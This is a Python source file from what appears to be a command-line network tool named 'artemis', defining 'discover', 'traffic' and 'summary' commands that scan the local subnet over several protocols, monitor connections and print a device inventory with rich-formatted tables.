@click.option("-s", "--subnet", default=None, help="Subnet to scan")
@click.option("--no-mdns", is_flag=True, help="Disable mDNS discovery")
@click.option("--no-ssdp", is_flag=True, help="Disable SSDP/UPnP discovery")
@click.option("--no-netbios", is_flag=True, help="Disable NetBIOS discovery")
@click.option("--no-ports", is_flag=True, help="Disable port scanning")
@click.option("-v", "--verbose", is_flag=True, help="Verbose output")
def discover(
    subnet: Optional[str],
    no_mdns: bool,
    no_ssdp: bool,
    no_netbios: bool,
    no_ports: bool,
    verbose: bool,
):
    """Enhanced network discovery - finds ALL devices.
    
    Uses multiple protocols to find every device on your network:
    - ARP scanning (all devices)
    - mDNS/Bonjour (Apple, Chromecast, printers)
    - SSDP/UPnP (Smart TVs, media devices)
    - NetBIOS (Windows devices)
    - Port scanning (service identification)
    
    Examples:
    
        artemis network discover
        
        artemis network discover --no-ssdp
    """
    from artemis.agent import EnhancedNetworkDiscovery, DeviceType
    import logging
    
    if verbose:
        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
    
    async def run_discovery():
        scanner = EnhancedNetworkDiscovery(
            subnet=subnet,
            enable_mdns=not no_mdns,
            enable_ssdp=not no_ssdp,
            enable_netbios=not no_netbios,
            port_scan=not no_ports,
        )
        await scanner.initialize()
        
        console.print(Panel.fit(
            f"[bold cyan]ENHANCED NETWORK DISCOVERY[/bold cyan]\n"
            f"[dim]Subnet: {scanner.subnet}[/dim]\n"
            f"[dim]Local IP: {scanner.local_ip}[/dim]\n"
            f"[dim]Gateway: {scanner.gateway_ip}[/dim]\n"
            f"[dim]mDNS: {'on' if not no_mdns else 'off'} | SSDP: {'on' if not no_ssdp else 'off'} | NetBIOS: {'on' if not no_netbios else 'off'}[/dim]",
            border_style="cyan",
        ))
        console.print()
        
        with console.status("[bold blue]Scanning network with all protocols..."):
            devices = await scanner.full_scan()
        
        return scanner
    
    scanner = asyncio.run(run_discovery())
    devices = scanner.devices
    
    if not devices:
        console.print("[yellow]No devices found[/yellow]")
        return
    
    # Group by device type
    by_type: dict[str, list] = {}
    for device in devices:
        dtype = device.device_type.value
        if dtype not in by_type:
            by_type[dtype] = []
        by_type[dtype].append(device)
    
    # Summary
    console.print(f"\n[bold green]Found {len(devices)} devices[/bold green]\n")
    
    # Print by category
    type_order = [
        "router", "access_point", "switch", "firewall",
        "desktop", "laptop", "server", "workstation",
        "smartphone", "tablet",
        "smart_tv", "streaming_device", "speaker", "media_player",
        "game_console", "handheld",
        "nas", "printer",
        "smart_home_hub", "voice_assistant", "smart_light", "doorbell", "camera", "thermostat",
        "virtual_machine",
        "unknown",
    ]
    
    for dtype in type_order:
        if dtype in by_type:
            type_devices = by_type[dtype]
            console.print(f"\n[bold]{dtype.replace('_', ' ').title()}[/bold] ({len(type_devices)})")
            
            for device in type_devices:
                status = "[green]●[/green]" if device.is_local or device.is_gateway else "[dim]●[/dim]"
                name = device.hostname or device.netbios_name or device.mdns_name or "-"
                vendor = device.manufacturer or "-"
                
                extra = ""
                if device.is_gateway:
                    extra = " [dim](gateway)[/dim]"
                elif device.is_local:
                    extra = " [dim](this host)[/dim]"
                
                ports_str = ""
                if device.open_ports:
                    ports_str = f" [dim][{', '.join(str(p) for p in device.open_ports[:5])}][/dim]"
                
                console.print(f"  {status} [cyan]{device.ip_address:15}[/cyan] {name:20} {vendor:15}{extra}{ports_str}")
    
    # Discovery methods summary
    console.print("\n[bold]Discovery Methods Used:[/bold]")
    method_counts = {}
    for device in devices:
        for method in device.discovery_methods:
            method_counts[method] = method_counts.get(method, 0) + 1
    for method, count in sorted(method_counts.items()):
        console.print(f"  {method}: {count} devices")


@network.command()
@click.option("-v", "--verbose", is_flag=True, help="Verbose output")
def traffic(verbose: bool):
    """Monitor network traffic (requires Administrator).
    
    Tracks all network connections, monitors per-device activity,
    and detects suspicious traffic patterns.
    
    Requires running as Administrator for full packet visibility.
    
    Example:
    
        artemis network traffic
    """
    from artemis.agent import TrafficMonitor, is_admin
    import logging
    
    if not is_admin():
        console.print("[red]ERROR:[/red] Traffic monitoring requires Administrator privileges.")
        console.print("[dim]Right-click and 'Run as Administrator', or use:[/dim]")
        console.print("[cyan]  runas /user:Administrator \"artemis network traffic\"[/cyan]")
        sys.exit(1)
    
    if verbose:
        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
    
    console.print(Panel.fit(
        "[bold cyan]NETWORK TRAFFIC MONITOR[/bold cyan]\n"
        "[dim]Monitoring all network connections[/dim]",
        border_style="cyan",
    ))
    console.print()
    console.print("[dim]Press Ctrl+C to stop[/dim]")
    console.print()
    
    async def run_monitor():
        monitor = TrafficMonitor(capture_dns=True)
        
        async def on_flow(flow):
            # Show new connections
            service = flow.process_name or "unknown"
            console.print(
                f"[dim]{datetime.now().strftime('%H:%M:%S')}[/dim] "
                f"[cyan]{flow.src_ip}:{flow.src_port}[/cyan] → "
                f"[yellow]{flow.dst_ip}:{flow.dst_port}[/yellow] "
                f"[dim]({flow.protocol.value})[/dim] "
                f"[green]{service}[/green]"
            )
        
        monitor.on_flow(on_flow)
        
        try:
            await monitor.start()
        except KeyboardInterrupt:
            await monitor.stop()
            
            # Print summary
            console.print("\n[bold]Traffic Summary[/bold]")
            
            top_talkers = monitor.get_top_talkers(10)
            if top_talkers:
                table = Table(title="Top Talkers")
                table.add_column("IP")
                table.add_column("Connections")
                table.add_column("Ports")
                table.add_column("Destinations")
                
                for device in top_talkers:
                    table.add_row(
                        device.ip_address,
                        str(device.connections),
                        str(len(device.ports_used)),
                        str(len(device.destinations)),
                    )
                
                console.print(table)
    
    try:
        asyncio.run(run_monitor())
    except KeyboardInterrupt:
        console.print("\n[yellow]Monitor stopped[/yellow]")


@network.command()
def summary():
    """Show network summary and device counts."""
    from artemis.agent import EnhancedNetworkDiscovery
    
    async def load_inventory():
        scanner = EnhancedNetworkDiscovery()
        await scanner.initialize()
        return scanner
    
    scanner = asyncio.run(load_inventory())
    devices = scanner.devices
    
    if not devices:
        console.print("[dim]No devices in inventory. Run 'artemis network discover' first.[/dim]")
        return
    
    console.print(Panel.fit(
        f"[bold cyan]NETWORK SUMMARY[/bold cyan]\n"
        f"[dim]Subnet: {scanner.subnet}[/dim]",
        border_style="cyan",
    ))
    console.print()
    
    summary = scanner.get_summary()
    
    table = Table(title=f"Device Inventory ({len(devices)} total)")
    table.add_column("Category", style="cyan")
    table.add_column("Count", justify="right")
    
    for dtype, count in sorted(summary.items(), key=lambda x: -x[1]):
        table.add_row(dtype.replace("_", " ").title(), str(count))
    
    console.print(table)
    
    # Recent devices
    recent = sorted(devices, key=lambda d: d.last_seen, reverse=True)[:5]
    console.print("\n[bold]Recently Active:[/bold]")
    for device in recent:
        name = device.hostname or device.netbios_name or "-"
        console.print(f"  [cyan]{device.ip_address}[/cyan] {name} - {device.last_seen.strftime('%Y-%m-%d %H:%M')}")


if __name__ == "__main__":
    main()
